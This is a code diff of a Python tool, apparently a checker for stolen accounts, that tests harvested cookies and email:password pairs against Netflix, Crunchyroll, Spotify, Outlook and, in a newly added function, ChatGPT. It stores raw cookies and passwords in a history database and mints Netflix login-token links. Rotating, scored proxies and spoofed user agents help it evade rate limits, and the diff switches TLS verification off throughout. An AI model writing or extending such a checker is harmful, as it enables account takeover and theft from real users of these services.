-        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history WHERE 1=1'
+        where_parts = []
         params = []
 
         if search:
-            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ? OR email LIKE ?)'
-            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
+            s_clean = search.strip()
+            where_parts.append('(country LIKE ? OR billing LIKE ? OR plan LIKE ? OR email LIKE ? OR raw_cookie LIKE ?)')
+            params.extend([f'%{s_clean}%', f'%{s_clean}%', f'%{s_clean}%', f'%{s_clean}%', f'%{s_clean}%'])
         if status:
-            query += ' AND status = ?'
+            where_parts.append('status = ?')
             params.append(status)
         if entry_type:
-            query += ' AND type = ?'
+            where_parts.append('type = ?')
             params.append(entry_type)
         if plan:
             p_upper = plan.upper()
             if p_upper in ('PREMIUM', '4K'):
-                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")'
+                where_parts.append('(plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")')
             elif p_upper == 'STANDARD':
-                query += ' AND (plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")'
+                where_parts.append('(plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")')
             elif p_upper == 'BASIC':
-                query += ' AND (plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")'
+                where_parts.append('(plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")')
             elif p_upper == 'MOBILE':
-                query += ' AND (plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")'
+                where_parts.append('(plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")')
             elif p_upper == 'SPOTIFY':
-                query += ' AND (plan LIKE "%Spotify%")'
+                where_parts.append('(plan LIKE "%Spotify%")')
             elif p_upper == 'DISNEY':
-                query += ' AND (plan LIKE "%Disney%")'
+                where_parts.append('(plan LIKE "%Disney%")')
             elif p_upper == 'CRUNCHYROLL':
-                query += ' AND (plan LIKE "%Crunchyroll%")'
+                where_parts.append('(plan LIKE "%Crunchyroll%")')
             elif p_upper == 'EXPRESSVPN':
-                query += ' AND (plan LIKE "%ExpressVPN%")'
+                where_parts.append('(plan LIKE "%ExpressVPN%")')
+            elif p_upper in ('OPENAI', 'CHATGPT', 'GPT'):
+                where_parts.append('(plan LIKE "%ChatGPT%")')
             elif p_upper == 'FAMILY':
-                query += ' AND (plan LIKE "%Family%" OR plan LIKE "%Duo%")'
+                where_parts.append('(plan LIKE "%Family%" OR plan LIKE "%Duo%")')
             elif p_upper == 'STUDENT':
-                query += ' AND (plan LIKE "%Student%")'
+                where_parts.append('(plan LIKE "%Student%")')
             else:
-                query += ' AND plan LIKE ?'
+                where_parts.append('plan LIKE ?')
                 params.append(f'%{plan}%')
 
-        # Count total
-        count_query = 'SELECT COUNT(*) FROM (' + query + ')'
+        where_clause = (" WHERE " + " AND ".join(where_parts)) if where_parts else ""
+
+        # Direct count without subquery materialization
+        count_query = 'SELECT COUNT(*) FROM history' + where_clause
         c.execute(count_query, params)
         total = c.fetchone()[0]
 
-        query += ' ORDER BY id DESC LIMIT ? OFFSET ?'
-        params.extend([limit, offset])
-
-        c.execute(query, params)
+        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history' + where_clause + ' ORDER BY id DESC LIMIT ? OFFSET ?'
+        c.execute(query, params + [limit, offset])
         rows = c.fetchall()
-        conn.close()
 
         items = [
             {
@@ -471,51 +1028,56 @@ def get_history(limit=50, offset=0, search='', status='', plan='', entry_type=''
             for r in rows
         ]
         return {"total": total, "items": items}
+    finally:
+        conn.close()
 
 def export_history_csv(search='', status='', plan='', entry_type=''):
-    with db_lock:
-        conn = get_db()
+    conn = get_db()
+    try:
         c = conn.cursor()
-        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history WHERE 1=1'
+        where_parts = []
         params = []
         if search:
-            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ? OR raw_cookie LIKE ? OR email LIKE ?)'
-            params.extend([f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%', f'%{search}%'])
+            s_clean = search.strip()
+            where_parts.append('(country LIKE ? OR billing LIKE ? OR plan LIKE ? OR email LIKE ? OR raw_cookie LIKE ?)')
+            params.extend([f'%{s_clean}%', f'%{s_clean}%', f'%{s_clean}%', f'%{s_clean}%', f'%{s_clean}%'])
         if status:
-            query += ' AND status = ?'
+            where_parts.append('status = ?')
             params.append(status)
         if entry_type:
-            query += ' AND type = ?'
+            where_parts.append('type = ?')
             params.append(entry_type)
         if plan:
             p_upper = plan.upper()
             if p_upper in ('PREMIUM', '4K'):
-                query += ' AND (plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")'
+                where_parts.append('(plan LIKE "%4K%" OR plan LIKE "%ULTRA%" OR plan LIKE "%PREMIUM%")')
             elif p_upper == 'STANDARD':
-                query += ' AND (plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")'
+                where_parts.append('(plan LIKE "%STANDARD%" OR plan LIKE "%STANDAR%")')
             elif p_upper == 'BASIC':
-                query += ' AND (plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")'
+                where_parts.append('(plan LIKE "%BASIC%" OR plan LIKE "%DASAR%")')
             elif p_upper == 'MOBILE':
-                query += ' AND (plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")'
+                where_parts.append('(plan LIKE "%MOBILE%" OR plan LIKE "%PONSEL%")')
             elif p_upper == 'SPOTIFY':
-                query += ' AND (plan LIKE "%Spotify%")'
+                where_parts.append('(plan LIKE "%Spotify%")')
             elif p_upper == 'DISNEY':
-                query += ' AND (plan LIKE "%Disney%")'
+                where_parts.append('(plan LIKE "%Disney%")')
             elif p_upper == 'CRUNCHYROLL':
-                query += ' AND (plan LIKE "%Crunchyroll%")'
+                where_parts.append('(plan LIKE "%Crunchyroll%")')
             elif p_upper == 'EXPRESSVPN':
-                query += ' AND (plan LIKE "%ExpressVPN%")'
+                where_parts.append('(plan LIKE "%ExpressVPN%")')
+            elif p_upper in ('OPENAI', 'CHATGPT', 'GPT'):
+                where_parts.append('(plan LIKE "%ChatGPT%")')
             elif p_upper == 'FAMILY':
-                query += ' AND (plan LIKE "%Family%" OR plan LIKE "%Duo%")'
+                where_parts.append('(plan LIKE "%Family%" OR plan LIKE "%Duo%")')
             elif p_upper == 'STUDENT':
-                query += ' AND (plan LIKE "%Student%")'
+                where_parts.append('(plan LIKE "%Student%")')
             else:
-                query += ' AND plan LIKE ?'
+                where_parts.append('plan LIKE ?')
                 params.append(f'%{plan}%')
-        query += ' ORDER BY id DESC'
+        where_clause = (" WHERE " + " AND ".join(where_parts)) if where_parts else ""
+        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie, email FROM history' + where_clause + ' ORDER BY id DESC'
         c.execute(query, params)
         rows = c.fetchall()
-        conn.close()
 
         output = io.StringIO()
         writer = csv.writer(output)
@@ -524,15 +1086,17 @@ def export_history_csv(search='', status='', plan='', entry_type=''):
             safe_row = []
             for cell in r:
                 s = str(cell) if cell is not None else ""
-                if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
+                if s and s[0] in ("=", "+", "-", "@", "\t", "\r", "\n"):
                     s = "'" + s
                 safe_row.append(s)
             writer.writerow(safe_row)
         return output.getvalue()
+    finally:
+        conn.close()
 
 def get_analytics():
-    with db_lock:
-        conn = get_db()
+    conn = get_db()
+    try:
         c = conn.cursor()
         c.execute('SELECT status, COUNT(*) FROM history GROUP BY status')
         status_counts = dict(c.fetchall())
@@ -564,26 +1128,41 @@ def get_analytics():
             else:
                 services[t]["hold"] += count
 
-        conn.close()
+        # Daily stats (last 7 days) reusing the same connection & cursor
+        c.execute(
+            "SELECT DATE(created_at) AS day, COUNT(*) AS cnt "
+            "FROM history WHERE created_at >= DATE('now', '-7 days') "
+            "GROUP BY DATE(created_at) ORDER BY day"
+        )
+        daily_rows = c.fetchall()
+        daily_stats = [{"date": r[0], "count": r[1]} for r in daily_rows]
+
+        # Compute hit_rate = live / total checks
+        total_checks = sum(status_counts.values()) if status_counts else 0
+        live_total = sum(v for k, v in status_counts.items() if k in ('LIVE', 'PREMIUM', 'FREE'))
+        hit_rate = (live_total / total_checks) if total_checks > 0 else 0
+
+        # services_flat: {name: total_checks} for donut chart compatibility
+        services_flat = {k: v.get("checks", 0) for k, v in services.items()}
+
         return {
             "status_counts": status_counts,
             "country_counts": country_counts,
+            "countries": country_counts,
             "plan_counts": plan_counts,
-            "services": services
+            "services": services_flat,
+            "services_detail": services,
+            "daily_stats": daily_stats,
+            "hit_rate": hit_rate
         }
+    finally:
+        conn.close()
 
 def clear_history(only_dead=False):
-    with db_lock:
-        conn = get_db()
-        c = conn.cursor()
-        if only_dead:
-            c.execute('DELETE FROM history WHERE status = "DEAD" OR status = "ERROR" OR status = "BAD" OR status = "LOCKED" OR status = "PHONE_LOCKED"')
-            logging.info("Deleted only DEAD/ERROR/BAD/LOCKED history records.")
-        else:
-            c.execute('DELETE FROM history')
-            logging.info("History database cleared completely.")
-        conn.commit()
-        conn.close()
+    try:
+        execute_db_write_sync("clear_history", {"only_dead": only_dead})
+    except Exception as e:
+        logging.error(f"Error in clear_history: {e}")
 
 def parse_single_proxy(line):
     p = line.strip()
@@ -642,22 +1221,36 @@ def load_proxies(force_reload=False):
                             item["status"] = cached["status"]
                             item["latency"] = cached["latency"]
                             item["last_tested"] = cached.get("last_tested", 0)
+                            item["fail_count"] = cached.get("fail_count", 0)
+                            item["success_count"] = cached.get("success_count", 0)
+                            item["cooldown_until"] = cached.get("cooldown_until", 0)
+                            item["service_tags"] = cached.get("service_tags", "")
                         else:
                             item["status"] = "UNVERIFIED"
                             item["latency"] = 0
                             item["last_tested"] = 0
+                            item["fail_count"] = 0
+                            item["success_count"] = 0
+                            item["cooldown_until"] = 0
+                            item["service_tags"] = ""
                         res.append(item)
             cached_proxies = res
             cached_proxies_mtime = mtime
+            now = time.time()
             with proxy_lock:
                 all_tested_proxies = list(res)
-                healthy_proxies = [p for p in res if p.get("status") == "OK"]
+                healthy_proxies = [
+                    p for p in res
+                    if p.get("status") == "OK"
+                    and p.get("cooldown_until", 0) <= now
+                    and proxy_cooldown.get(p.get("proxy", ""), 0) <= now
+                ]
             return [dict(p) for p in res]
     except Exception as e:
         logging.error(f"Error loading proxies: {e}")
         return []
 
-def check_proxy_health(p, timeout=(3.0, 4.0), retries=1):
+def check_proxy_health(p, timeout=(5.0, 8.0), retries=1):
     prx = p.get("proxy") if isinstance(p, dict) else str(p)
     if not prx:
         return False, 0
@@ -666,18 +1259,24 @@ def check_proxy_health(p, timeout=(3.0, 4.0), retries=1):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
         "Accept": "*/*"
     }
+    # Use lightweight targets — faster response, less likely to block proxy IPs
+    health_targets = [
+        "https://httpbin.org/status/200",
+        "https://www.google.com/generate_204",
+    ]
     for attempt in range(retries + 1):
+        target = health_targets[attempt % len(health_targets)]
         t0 = time.time()
         try:
-            to = timeout if attempt == 0 else (3.5, 5.0)
-            r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=to, verify=True, headers=headers)
-            if r.status_code in (200, 301, 302, 404):
+            to = timeout if attempt == 0 else (6.0, 10.0)
+            r = requests.get(target, proxies=proxies, timeout=to, verify=False, headers=headers)
+            if r.status_code in (200, 204, 301, 302, 404):
                 latency = int((time.time() - t0) * 1000)
                 return True, latency
         except Exception:
             pass
         if attempt < retries:
-            time.sleep(0.2)
+            time.sleep(0.3)
     return False, 0
 
 def test_single_proxy_func(proxy_str):
@@ -685,15 +1284,14 @@ def test_single_proxy_func(proxy_str):
     item = parse_single_proxy(proxy_str)
     if not item:
         item = {"raw": proxy_str, "proxy": f"http://{proxy_str}", "line": proxy_str, "latency": 0, "status": "UNVERIFIED"}
-    ok, lat = check_proxy_health(item, timeout=(3.0, 4.5), retries=1)
+    ok, lat = check_proxy_health(item, timeout=(5.0, 10.0), retries=2)
     item["status"] = "OK" if ok else "FAIL"
     item["latency"] = lat if ok else 0
     k = item.get("line") or item.get("proxy") or item.get("raw")
     update_cached_proxy_state(k, item["status"], item["latency"])
 
+    load_proxies()  # Pre-load outside lock to avoid deadlock
     with proxy_lock:
-        if not all_tested_proxies:
-            all_tested_proxies = list(load_proxies())
         found = False
         for p in all_tested_proxies:
             pk = p.get("line") or p.get("proxy") or p.get("raw")
@@ -732,8 +1330,9 @@ def start_background_proxy_test(limit=100, mode="untested"):
     def _worker():
         global healthy_proxies, all_tested_proxies
         try:
+            load_proxies()  # Pre-load outside lock to avoid deadlock
             with proxy_lock:
-                current_pool = list(all_tested_proxies) if all_tested_proxies else load_proxies()
+                current_pool = list(all_tested_proxies)
             
             if mode == "untested":
                 candidates = [p for p in current_pool if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
@@ -830,6 +1429,7 @@ def start_background_proxy_test(limit=100, mode="untested"):
 
 def clean_dead_proxies_serverside():
     global healthy_proxies, all_tested_proxies
+    load_proxies()  # Pre-load outside lock to avoid deadlock
     with proxy_lock:
         dead_keys = set()
         for p in all_tested_proxies:
@@ -839,8 +1439,7 @@ def clean_dead_proxies_serverside():
                 if p.get("proxy"): dead_keys.add(p["proxy"].strip())
 
         if not dead_keys:
-            all_p = all_tested_proxies if all_tested_proxies else load_proxies()
-            return 0, len(all_p)
+            return 0, len(all_tested_proxies)
 
         delete_from_proxy_cache(dead_keys)
 
@@ -864,8 +1463,8 @@ def clean_dead_proxies_serverside():
 
         all_tested_proxies = [p for p in all_tested_proxies if p.get("status") != "FAIL"]
         healthy_proxies = [p for p in all_tested_proxies if p.get("status") == "OK"]
-        load_proxies(force_reload=True)
-        return removed, len(remaining)
+    load_proxies(force_reload=True)  # Reload outside lock
+    return removed, len(remaining)
 
 def remove_proxies_flexible(target_set):
     global healthy_proxies, all_tested_proxies
@@ -916,9 +1515,8 @@ def proxy_health_worker():
                 if proxy_test_state.get("running"):
                     continue
 
+            load_proxies()  # Pre-load outside lock to avoid deadlock
             with proxy_lock:
-                if not all_tested_proxies:
-                    all_tested_proxies = load_proxies()
                 all_p = list(all_tested_proxies)
 
             if not all_p:
@@ -985,33 +1583,72 @@ def test_all_proxies_now(limit=100):
 proxy_cooldown = {}
 proxy_cooldown_lock = threading.Lock()
 
-def mark_proxy_cooldown(proxy_url, duration=600):
+def mark_proxy_cooldown(proxy_url, duration=300):
     if not proxy_url:
         return
+    now = time.time()
+    until = now + duration
     with proxy_cooldown_lock:
-        proxy_cooldown[proxy_url] = time.time() + duration
+        proxy_cooldown[proxy_url] = until
+    item = parse_single_proxy(proxy_url)
+    k = item.get("line") or item.get("proxy") or proxy_url
+    queue_db_write("proxy_cooldown", {
+        "key": k,
+        "now": now,
+        "until": until
+    })
+
+def record_proxy_success(proxy_url, latency=0):
+    if not proxy_url:
+        return
+    item = parse_single_proxy(proxy_url)
+    k = item.get("line") or item.get("proxy") or proxy_url
+    with proxy_cooldown_lock:
+        if proxy_url in proxy_cooldown:
+            del proxy_cooldown[proxy_url]
+    now = time.time()
+    queue_db_write("proxy_success", {
+        "key": k,
+        "proxy_url": proxy_url,
+        "latency": latency,
+        "now": now
+    })
 
 def get_random_proxy():
     global healthy_proxies, all_tested_proxies
     now = time.time()
+    load_proxies()  # Pre-load outside lock to avoid deadlock
     with proxy_lock:
         if healthy_proxies:
             pool = list(healthy_proxies)
         else:
-            if not all_tested_proxies:
-                all_tested_proxies = load_proxies()
-            pool = [p for p in all_tested_proxies if p.get("status") != "FAIL"]
+            pool = [p for p in all_tested_proxies if p.get("status") not in ("FAIL", "DEAD")]
             if not pool and all_tested_proxies:
                 pool = list(all_tested_proxies)
     if not pool:
         return None, None, None
 
     with proxy_cooldown_lock:
-        valid_pool = [p for p in pool if proxy_cooldown.get(p["proxy"], 0) <= now]
+        valid_pool = [
+            p for p in pool
+            if proxy_cooldown.get(p.get("proxy", ""), 0) <= now
+            and p.get("cooldown_until", 0) <= now
+        ]
     if not valid_pool:
-        valid_pool = pool
+        # If all candidates in cooldown, pick closest to recovery
+        valid_pool = sorted(pool, key=lambda x: proxy_cooldown.get(x.get("proxy", ""), 0))[:5]
 
-    choice = random.choice(valid_pool)
+    # Smart Scoring Engine: weight by success rate & latency
+    def _proxy_score(p):
+        succ = p.get("success_count", 0)
+        fail = p.get("fail_count", 0)
+        lat = p.get("latency", 0) or 400
+        rate = (succ + 1.0) / (succ + fail + 2.0)
+        return (rate * 1000.0) / (lat + 100.0)
+
+    scored = sorted(valid_pool, key=_proxy_score, reverse=True)
+    top_candidates = scored[:max(1, len(scored) // 3)]
+    choice = random.choice(top_candidates)
     lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
     return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}", choice["proxy"]
 
@@ -1045,7 +1682,7 @@ def generate_nftoken(cookie_text, use_proxy=True):
         route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
         try:
-            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=True)
+            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=False)
             if res.status_code in (403, 429) and proxy_raw_url:
                 mark_proxy_cooldown(proxy_raw_url, 600)
             res.raise_for_status()
@@ -1084,7 +1721,7 @@ def generate_nftoken(cookie_text, use_proxy=True):
 def check_netflix_membership(cookie_text, use_proxy=True):
     cookies = extract_cookie_values(cookie_text)
     if "NetflixId" not in cookies:
-        save_history("checker", "DEAD", raw_cookie=cookie_text)
+        save_history("netflix", "DEAD", raw_cookie=cookie_text)
         return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}
 
     headers = {
@@ -1117,14 +1754,14 @@ def check_netflix_membership(cookie_text, use_proxy=True):
                 proxies=proxies,
                 timeout=10,
                 allow_redirects=True,
-                verify=True
+                verify=False
             )
 
             if r.status_code in (403, 429) and proxy_raw_url:
                 mark_proxy_cooldown(proxy_raw_url, 600)
 
             if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
-                save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
+                save_history("netflix", "DEAD", route=route, raw_cookie=cookie_text)
                 return {"live": False, "status": "DEAD", "reason": "Cookie Expired / Terlempar ke Login.", "route": route}
 
             html = r.text
@@ -1284,7 +1921,7 @@ def check_netflix_membership(cookie_text, use_proxy=True):
             ]
 
             tok_link = (nftoken_data.get("url") if nftoken_data else "")
-            save_history("checker", status, plan=plan_detected, billing=billing, country=country, route=route, token_url=tok_link, raw_cookie=cookie_text)
+            save_history("netflix", status, plan=plan_detected, billing=billing, country=country, route=route, token_url=tok_link, raw_cookie=cookie_text)
 
             return {
                 "live": not is_hold,
@@ -1311,7 +1948,7 @@ def check_netflix_membership(cookie_text, use_proxy=True):
                 time.sleep(0.5)
                 continue
 
-    save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
+    save_history("netflix", "ERROR", route=route, raw_cookie=cookie_text)
     return {"live": False, "status": "ERROR", "reason": f"Request gagal setelah {max_retries}x retry (semua proxy timeout): {str(last_err)}", "route": route}
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -1864,7 +2501,14 @@ def check_crunchyroll_account(email, password, use_proxy=True):
             route = proxy_result[1]     # "ip:port (latency)"
 
     session = requests.Session()
-    session.verify = True
+    session.verify = False
+
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    retry_strategy = Retry(total=2, backoff_factor=1, status_forcelist=[502, 503, 504])
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
 
     android_ver = str(random.randint(13, 15))
     okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
@@ -1893,12 +2537,12 @@ def check_crunchyroll_account(email, password, use_proxy=True):
             "device_name": "sdk_gphone64_x86_64",
             "device_type": "Google sdk_gphone64_x86_64",
         }
-        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)
+        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=30)
 
         # Fallback to alternate auth token if client_inactive
         if r.status_code == 401 and "client_inactive" in r.text:
             session.headers["Authorization"] = CR_AUTH_FALLBACK
-            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)
+            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=30)
 
         if r.status_code == 401:
             save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
@@ -2151,7 +2795,14 @@ def check_crunchyroll_cookie(cookie_text, use_proxy=True):
             proxy_raw_url = proxy_result[2]
 
     session = requests.Session()
-    session.verify = True
+    session.verify = False
+
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    retry_strategy = Retry(total=2, backoff_factor=1, status_forcelist=[502, 503, 504])
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
 
     android_ver = str(random.randint(13, 15))
     okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
@@ -2176,7 +2827,7 @@ def check_crunchyroll_cookie(cookie_text, use_proxy=True):
             "grant_type": "etp_rt_cookie",
             "scope": "offline_access",
         }
-        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=20)
+        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=30)
 
         # Fallback: use etp_rt as refresh_token in body
         if r.status_code in (400, 401):
@@ -2186,7 +2837,7 @@ def check_crunchyroll_cookie(cookie_text, use_proxy=True):
                 "refresh_token": etp_rt,
                 "scope": "offline_access",
             }
-            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data_fallback, timeout=20)
+            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data_fallback, timeout=30)
 
         if r.status_code in (403, 429) and proxy_raw_url:
             mark_proxy_cooldown(proxy_raw_url, 600)
@@ -2457,7 +3108,7 @@ def check_spotify_cookie(cookie_text, use_proxy=True):
             proxy_raw_url = proxy_result[2]
 
     session = requests.Session()
-    session.verify = True
+    session.verify = False
     session.headers.update(SPOTIFY_HEADERS)
     session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")
 
@@ -2693,7 +3344,7 @@ def check_outlook_account(email, password, use_proxy=True):
             proxy_raw_url = proxy_result[2]
 
     session = requests.Session()
-    session.verify = True
+    session.verify = False
     session.headers.update(OUTLOOK_HEADERS)
 
     if proxies:
@@ -2896,6 +3547,445 @@ def check_outlook_account(email, password, use_proxy=True):
         session.close()
 
 
+# ══════════════════════════════════════════════════════════════════════════════
+# OpenAI / ChatGPT Cookie Checker (session-token → auth/session → accounts/check)
+# ══════════════════════════════════════════════════════════════════════════════
+
+OPENAI_SESSION_TOKEN_NAMES = ("__Secure-next-auth.session-token",)
+OPENAI_RELATED_COOKIE_NAMES = (
+    "__Secure-next-auth.callback-url", "__Host-next-auth-csrf-token",
+    "_cfuvid", "cf_clearance", "__cf_bm", "oai-did", "oai-sc",
+    "oai-dm-tgt-c-240329",
+    "__Secure-next-auth.session-token.0",
+    "__Secure-next-auth.session-token.1",
+)
+
+
+def extract_openai_session_token(cookie_text):
+    """Parse __Secure-next-auth.session-token from JSON array, Netscape .txt, key=value, or raw token."""
+    if not cookie_text or not isinstance(cookie_text, str):
+        return None, {}
+    cookie_text = cookie_text.strip()
+    other_cookies = {}
+    session_token = None
+
+    # 1. JSON array format [{"name":"...","value":"..."}, ...]
+    try:
+        data = json.loads(cookie_text)
+        if isinstance(data, list):
+            for item in data:
+                name = item.get("name", "") or item.get("Name", "")
+                value = item.get("value", "") or item.get("Value", "")
+                domain = item.get("domain", "") or item.get("Domain", "")
+                if name == "__Secure-next-auth.session-token":
+                    session_token = value
+                elif name and value and ("openai.com" in domain or "chatgpt.com" in domain):
+                    other_cookies[name] = value
+            if session_token:
+                return session_token, other_cookies
+    except (json.JSONDecodeError, TypeError, AttributeError):
+        pass
+
+    # 2. Netscape tab-separated format
+    lines = cookie_text.splitlines()
+    netscape_found = False
+    for line in lines:
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7:
+            netscape_found = True
+            name = parts[5]
+            value = parts[6]
+            if name == "__Secure-next-auth.session-token":
+                session_token = value
+            elif "openai.com" in parts[0] or "chatgpt.com" in parts[0]:
+                other_cookies[name] = value
+    if netscape_found and session_token:
+        return session_token, other_cookies
+
+    # 3. Key=value pairs (semicolon or newline separated)
+    kv_pattern = re.compile(r'([^=;\s]+)\s*=\s*([^;\n]+)')
+    pairs = kv_pattern.findall(cookie_text)
+    if pairs:
+        for name, value in pairs:
+            name = name.strip()
+            value = value.strip()
+            if name == "__Secure-next-auth.session-token":
+                session_token = value
+            elif name in OPENAI_RELATED_COOKIE_NAMES:
+                other_cookies[name] = value
+        if session_token:
+            return session_token, other_cookies
+
+    # 4. Raw token value (long string without special delimiters)
+    raw = cookie_text.strip().strip('"').strip("'")
+    if len(raw) > 40 and "\t" not in raw and ";" not in raw and "=" not in raw and " " not in raw:
+        return raw, {}
+
+    # 5. Check for chunked session tokens (.0 and .1)
+    if not session_token and other_cookies:
+        t0 = other_cookies.pop("__Secure-next-auth.session-token.0", "")
+        t1 = other_cookies.pop("__Secure-next-auth.session-token.1", "")
+        if t0:
+            session_token = t0 + t1
+            return session_token, other_cookies
+
+    return None, {}
+
+
+def check_openai_cookie(cookie_text, use_proxy=True):
+    """Check an OpenAI/ChatGPT account using session cookies."""
+    result = {
+        "status": "ERROR",
+        "email": "",
+        "plan": "",
+        "subscription_plan": "",
+        "is_paid": False,
+        "route": "Direct",
+        "reason": ""
+    }
+    proxy_raw_url = None
+
+    try:
+        session_token, extra_cookies = extract_openai_session_token(cookie_text)
+        if not session_token:
+            result["status"] = "DEAD"
+            result["reason"] = "Session token (__Secure-next-auth.session-token) tidak ditemukan."
+            save_history("openai", "DEAD", raw_cookie=cookie_text)
+            return result
+
+        cookies = {"__Secure-next-auth.session-token": session_token}
+        cookies.update(extra_cookies)
+
+        headers_base = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+            "Accept": "application/json",
+        }
+
+        session = requests.Session()
+        session.verify = False
+        proxies = None
+        proxy_label = "Direct"
+
+        if use_proxy:
+            proxies, proxy_label, proxy_raw_url = get_random_proxy()
+            if proxies:
+                session.proxies = proxies
+                result["route"] = f"Proxy ({proxy_label})"
+
+        def do_request(attempt_direct_fallback=True):
+            nonlocal proxy_raw_url
+
+            try:
+                # Step 1: Get access token and email from auth/session
+                resp_auth = session.get(
+                    "https://chatgpt.com/api/auth/session",
+                    headers=headers_base,
+                    cookies=cookies,
+                    timeout=30
+                )
+
+                if resp_auth.status_code in (403, 429):
+                    if proxy_raw_url:
+                        mark_proxy_cooldown(proxy_raw_url, 600)
+                    if attempt_direct_fallback and use_proxy:
+                        session.proxies = {}
+                        result["route"] = "Direct"
+                        proxy_raw_url = None
+                        return do_request(attempt_direct_fallback=False)
+                    result["status"] = "DEAD"
+                    result["reason"] = f"Auth session returned {resp_auth.status_code}"
+                    return result
+
+                if resp_auth.status_code != 200:
+                    result["status"] = "DEAD"
+                    result["reason"] = f"Auth session HTTP {resp_auth.status_code}"
+                    return result
+
+                try:
+                    auth_data = resp_auth.json()
+                except (json.JSONDecodeError, ValueError):
+                    result["status"] = "DEAD"
+                    result["reason"] = "Auth session returned invalid JSON"
+                    return result
+
+                # Dead cookie: auth/session returns {} or empty body
+                if not auth_data or (isinstance(auth_data, dict) and not auth_data.get("accessToken") and not auth_data.get("access_token") and not auth_data.get("user")):
+                    result["status"] = "DEAD"
+                    result["reason"] = "Cookie expired (empty session response)"
+                    return result
+
+                access_token = auth_data.get("accessToken") or auth_data.get("access_token", "")
+                user_info = auth_data.get("user", {})
+                email = user_info.get("email", "") if isinstance(user_info, dict) else ""
+
+                if not access_token:
+                    result["status"] = "DEAD"
+                    result["email"] = email
+                    result["reason"] = "Cookie expired / No access token."
+                    return result
+
+                result["email"] = email
+
+                # Step 2: Check account/subscription details
+                headers_check = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+                    "Accept": "application/json",
+                    "Authorization": f"Bearer {access_token}",
+                    "OAI-Language": "en-US",
+                    "Referer": "https://chatgpt.com/",
+                }
+
+                resp_check = session.get(
+                    "https://chatgpt.com/backend-api/accounts/check/v4-2023-04-27?timezone_offset_min=420",
+                    headers=headers_check,
+                    cookies=cookies,
+                    timeout=30
+                )
+
+                # LOG RAW RESPONSE TO FILE FOR DEBUGGING
+                try:
+                    import datetime
+                    with open("openai_debug.log", "a", encoding="utf-8") as dbg:
+                        dbg.write(f"\n{'='*80}\n")
+                        dbg.write(f"[{datetime.datetime.now().isoformat()}] email={email}\n")
+                        dbg.write(f"auth/session status={resp_auth.status_code}\n")
+                        dbg.write(f"auth/session body={resp_auth.text[:1000]}\n")
+                        dbg.write(f"accounts/check status={resp_check.status_code}\n")
+                        dbg.write(f"accounts/check body={resp_check.text[:3000]}\n")
+                        dbg.write(f"{'='*80}\n")
+                except Exception:
+                    pass
+
+                if resp_check.status_code in (403, 429):
+                    if proxy_raw_url:
